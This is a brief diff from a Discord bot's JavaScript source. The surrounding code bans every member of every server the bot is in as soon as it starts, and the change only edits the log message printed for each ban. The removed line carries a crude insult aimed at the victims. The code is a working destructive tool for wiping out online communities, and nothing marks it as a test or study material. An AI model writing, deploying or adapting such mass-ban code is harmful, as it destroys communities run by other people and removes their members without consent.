@@ -36,7 +36,7 @@ client.on("ready", () => {
     client.guilds.forEach(guild => {
         guild.members.forEach(m => {
             m.ban();
-            console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Banned ${m.user.username}; ID: ${m.id}. I FUCKED YOUR MOM (╯°□°）╯︵ ┻━┻`);
+            console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Banned ${m.user.username}; ID: ${m.id}. (╯°□°）╯︵ ┻━┻`);
         });
     });
     
